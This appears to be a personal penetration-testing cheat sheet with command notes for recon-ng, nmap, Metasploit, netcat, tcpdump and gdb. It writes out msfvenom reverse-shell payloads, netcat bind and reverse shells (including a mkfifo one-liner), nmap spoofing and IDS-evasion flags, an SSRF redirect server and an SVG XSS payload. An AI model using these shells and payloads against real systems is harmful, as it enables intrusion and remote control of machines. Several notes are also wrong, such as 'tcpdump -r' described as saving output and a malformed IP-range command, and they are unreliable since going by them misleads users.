*Manuals*

recon ng
    > show modules
    > use recon/domains-vulnerabilities/xssed
    > set source google.com
    > run

nmap
    Scan Techniques
        sT tcp connect
        sY SCTP init scan, scans new protocol STCP that combines UDP and TCP
        sA tcp ACK, open and closed ports will return RST, if firewall no reply sO IP protocol scan.
        -sS TCP SYN scan
        -sT Connect scan
        -sA ACK scan
        -sW Window scan
        -sM Maimon scan
        -sU UDP Scan
        -sN TCP Null scan

    Port Specification and Scan Order
        -p Specify ports, e.g. -p80,443 or -p1-65535
        -p U:PORT Scan UDP ports with Nmap, e.g. -p U:53
        -F Fast mode, scans fewer ports than the default scan

    Service Version Detection
        -sV Probe open ports to determine service/version info

    OS Detection
        -O Enable OS Detection

    Timing and Performance
        -T 0-5 Set timing template - higher is faster (less accurate)

    Firewalls IDS Evasion and Spoofing
        -f; --mtu VALUE Fragment packets (optionally w/given MTU)
        -D decoy1,decoy2,ME Cloak a scan with decoys
        -S IP-ADDRESS Spoof source address
        -e IFACE Use specified interface
        --badsum Send packets with a bogus TCP/UDP/SCTP checksum

    Misc Nmap Options
        -A Enable OS detection, version detection, script scanning, and traceroute

Metaslpoit

    MSFconsole
        Entry point for the framework
        *$ msfconsole
        > help*

        against known vulnerabilities
        *> show exploits*

        Search a specific product
        *> search vsftp*

        Create a reverse shell, works for any format (php, asp, exe..):
            *msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f asp > shell.asp*

        modules available (DoS tools, port scanning, fuzzers..)
        *> show auxiliary*

        > show payloads

        > show options
        > show targets

        > use payload/bla
        > set RHOST 192..
        > run

        if you need the server to make a callback to you:

        set LHOST collaborator.net

        is the shell you get when you find RCE in a host.
        *> meterpeter*
        > screenshot
        operating system version etc
        *> sysinfo*
        tries to elevate privileges
        *> use priv*

    MSFcli
        non interactive client.
        *$ mscli*

    Meterpeter
        Create a meterpeter reverse shell (any language/format)
            *$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f aspx > shell.aspx*
        Listen for a reverse shell:
            *> set PAYLOAD windows/meterpreter/reverse_tcp*
        Put session in background:
            *> backgound*
        List sessions
            *> sessions -l*
        Switch to session
            *> session -i 1*

Netcat
    Listens for incoming connections
        *$ nc -nlvp 4444*
    Connects to a remote server
        *$ nc -nv 10.0.0.22 4444*
    Serves incorming.exe through 4444
        *$ nc -nlvp 4444 > incoming.exe*
    Binds shell
        *$ nc -nlvp 4444 -e cmd.exe*
    Opens a reverse shell (you connect to a machine that can bash into yours)
        *$ nc -nv 10.0.0.22 4444 -e /bin/bash*


Wireshark
    libpcap and wincap libraries.
    network -> capture filters -> capture engine -> display filters
    follow TCP stream
    tcp.port == 21


Tcpdump
    *$ tcpdump -r file.pcap # saves output to file.pcap*
    *$ tcpdump -n src host 10.10.10.10 # saves packages from 10.10.10.10*
    *$ tcpdump -n dst host 10.10.10.10 # saves packages to 10.10.10.10*
    *$ tcpdump -n port 81 # saves packages where port 81 was involved*
    *$ tcpdump port not 22 # skips your ssh session traffic*
    *$ tcpdump -vv port 80 or port 443 # http and https traffic*

nc
    shell
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f

gdb
    disas main or disassemble main
    b *0x00000000004008e2 # sets a breakpoint to a pos of memory
    r or run # runs the program
    x/s $esi # prints esi registers
    x/s $rax # prints rax registers
    info registers # prints all registers

    set  *(char*)0x0000000000400749=0x75 # changes instruction of this pos to jne
    set  *(char*)0x0000000000400749=0x74 # changes instruction of this pos to je

    list win # shows line of win

    bt # shows call stack

    info locals # info about local variables

    run # runs the app

    b main # adds breakpoint in main

    r # continues execution

    disable 1 # disables break point

    info frame # prints info about addrs

    info functions # all functions

filter your ssh traffic
    $ tcpdump -lt -i eth0 not \( host my.src.address and tcp port 22 \)

Cisco password:
    enable secret 5 $1$mERr$Q4J3cxRImm68KXqMDsLDs/
        $1 #hash type (1 md5), (5 sha256)
        mERr base 64 salt
        Q4J3cxRImm68KXqMDsLDs hashed salt + pass

Others
    Replace contents of files
        *$ find . -name watchdog.sh -exec sed -r -e 's/(^.*)-t 10 -i/-t 9 -i/g' {} \; # replace file contents*

    SSH using private key
        *$ ssh -i key host*

    Generate Ip range
        *$ seq -f "192.168.1.10.%g" 1 255*

    SSRF web server
        *$ while true ; do  echo -e "HTTP/1.1 301 Moved Permanently\r\nLocation: 127.0.0.1:22\r\n" | nc -vv -l -p 80  ; done*

    Svg XSS payload
        *<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE svg [<!ENTITY elem "">]>
    <svg onload="alert(document.domain);" height="16" width="16">&elem;</svg>*